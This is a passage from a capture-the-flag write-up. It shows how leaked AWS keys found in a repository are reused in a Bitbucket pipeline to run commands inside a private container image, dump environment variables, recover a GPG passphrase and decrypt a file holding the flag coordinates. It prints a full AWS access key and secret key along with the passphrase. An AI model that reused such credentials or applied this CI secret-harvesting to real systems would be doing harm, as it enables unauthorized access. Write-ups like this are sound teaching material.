Author: Eli Shemesh 
Date:   Wed Jun 30 10:35:56 2021 +0000
    Initial commit
commit b6fda9453a5dfbd39cbe89200a8ddf450060248b
Author: Eli Shemesh 
Date:   Wed Jun 30 10:34:39 2021 +0000
    Initial commit
```
Long story short, trying to access anything via the `awscli` fails - the user doesn't have permissions for almost anything. The only thing that does work is:
```console
┌──(user@kali)-[/media/sf_CTFs/cyberark/On_our_way_back_home/new2]
└─$ export AWS_ACCESS_KEY_ID=AKIA5FNOHSTOQECIOTPZ
┌──(user@kali)-[/media/sf_CTFs/cyberark/On_our_way_back_home/new2]
└─$ export AWS_SECRET_ACCESS_KEY=S/UmZq****
┌──(user@kali)-[/media/sf_CTFs/cyberark/On_our_way_back_home/new2]
└─$ export AWS_DEFAULT_REGION=us-west-2
┌──(user@kali)-[/media/sf_CTFs/cyberark/On_our_way_back_home/new2]
└─$ aws sts get-caller-identity
{
    "UserId": "AIDA5FNOHSTOX4C2Z76AU",
    "Account": "904992888029",
    "Arn": "arn:aws:iam::904992888029:user/ctf-bitbucket-access"
}
```
Trying to pull the `904992888029.dkr.ecr.us-west-2.amazonaws.com/wayhome:latest` docker image independently fails as well.
BUT - we have the pipeline, right? It's already deployed to bitbucket, how does it work? 
We clone the project and start with the following pipeline definition:
```yaml
image:
  name: 904992888029.dkr.ecr.us-west-2.amazonaws.com/wayhome:latest
  aws:
    access-key: AKIA5FNOHSTOQECIOTPZ
    secret-key: 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
pipelines:
  default:
     - step:
         script:
           - ls -al
```
A pipeline is automatically triggered. Output is:
```
+ ls -al
total 24
drwxrwxrwx 3 root root 4096 Jul 18 22:08 .
drwxr-xr-x 8 root root 4096 Jul 18 22:08 ..
drwxrwxrwx 8 root root 4096 Jul 18 22:08 .git
-rw-rw-rw- 1 root root  624 Jul 18 22:08 .gitignore
-rw-rw-rw- 1 root root  144 Jul 18 22:08 README.md
-rw-rw-rw- 1 root root  475 Jul 18 22:08 bitbucket-pipelines.yml
```
Now we try adding `ls /`:
```
+ ls /
bin
boot
dev
earth
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
We can see `/earth`, what's there? We add `ls /earth`:
```
+ ls /earth
coords.txt.gpg
```
So this is a GPG encrypted text file with coordinates. But we need the password. Where can we find it?
Well, after searching around everywhere and even trying to brute force the password with `john`, it turns out that it's hiding in the environment variables:
```
+ printenv
NVM_RC_VERSION=
PASS=wDmL7uC3H8FTr3vS
HOSTNAME=19fb8a86-fad3-42a4-ab43-f9e150d7b3ab-pl8xh
KUBERNETES_PORT_443_TCP_PORT=443
BITBUCKET_GIT_HTTP_ORIGIN=http://bitbucket.org/avivco94/expedition-test
KUBERNETES_PORT=tcp://10.34.224.1:443
BITBUCKET_PROJECT_KEY=TEST
DOCKER_HOST=tcp://localhost:2375
BITBUCKET_DOCKER_HOST_INTERNAL=10.39.129.148
KUBERNETES_SERVICE_PORT=443
KUBERNETES_SERVICE_HOST=10.34.224.1
BITBUCKET_COMMIT=2d7fd9d3ed13dcb54f6881a6238e691995aaade7
BITBUCKET_CLONE_DIR=/opt/atlassian/pipelines/agent/build
BITBUCKET_STEP_TRIGGERER_UUID={5eb3cb57-b0ba-46bc-b023-2bd28ad15d4c}
NVM_DIR=/root/.nvm
BITBUCKET_REPO_IS_PRIVATE=true
LS_COLORS=
BITBUCKET_REPO_SLUG=expedition-test
BITBUCKET_REPO_OWNER_UUID={ccc1ce6e-a4cc-4ebb-809e-0ea4457dc6f1}
PIPELINES_JWT_TOKEN=$PIPELINES_JWT_TOKEN
PATH=/root/.nvm:/bin/versions/node/v4.2.1/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NVM_NODEJS_ORG_MIRROR=https://nodejs.org/dist
PWD=/opt/atlassian/pipelines/agent/build
BITBUCKET_PIPELINE_UUID={d32eeb5c-14fd-4162-845c-6897bdb4d2ce}
BITBUCKET_BUILD_NUMBER=52
BITBUCKET_STEP_UUID={19fb8a86-fad3-42a4-ab43-f9e150d7b3ab}
BITBUCKET_WORKSPACE=avivco94
SHLVL=1
BITBUCKET_PROJECT_UUID={d4d15a2d-69cf-4d8f-9ba0-8a5c1b2cb9d6}
HOME=/root
BITBUCKET_GIT_SSH_ORIGIN=PI:EMAIL:avivco94/expedition-test.git
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_SERVICE_PORT_HTTPS=443
CI=true
BITBUCKET_REPO_UUID={e181a250-6b59-48e3-80a4-41d10ae6d663}
BITBUCKET_REPO_OWNER=avivco94
BITBUCKET_BRANCH=master
LESSOPEN=| /usr/bin/lesspipe %s
NVM_IOJS_ORG_MIRROR=https://iojs.org/dist
BITBUCKET_REPO_FULL_NAME=avivco94/expedition-test
BITBUCKET_STEP_RUN_NUMBER=1
DISPLAY=:99
KUBERNETES_PORT_443_TCP_ADDR=10.34.224.1
KUBERNETES_PORT_443_TCP=tcp://10.34.224.1:443
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/printenv
```
So we have the password: `wDmL7uC3H8FTr3vS`. Let's use it to decode the file:
```
+ gpg --no-armor -o - --passphrase wDmL7uC3H8FTr3vS -d coords.txt.gpg > coords.txt
gpg: CAST5 encrypted data
gpg: gpg-agent is not available in this session
gpg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected
```
And print the contents:
```
+ cat coords.txt
28.49662233341438, -80.54938494992965
```
The full yaml file:
```yaml
image:
  name: 904992888029.dkr.ecr.us-west-2.amazonaws.com/wayhome:latest
  aws:
    access-key: AKIA5FNOHSTOQECIOTPZ
    secret-key: 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
pipelines:
  default:
     - step:
         script:
           - ls -al
           - ls /
           - ls /earth
           - printenv
           - cd /earth
           - gpg --no-armor -o - --passphrase wDmL7uC3H8FTr3vS -d coords.txt.gpg > coords.txt
           - ls -al
           - cat coords.txt
```
We visit the coordinates in [Google Maps](https://www.google.com/maps/place/28%C2%B029'47.8%22N+80%C2%B032'57.8%22W/@28.496627,-80.5515736,17z/data=!3m1!4b1!4m5!3m4!1s0x0:0x0!8m2!3d28.4966223!4d-80.5493849) and get the flag: `Launch Complex 15`.
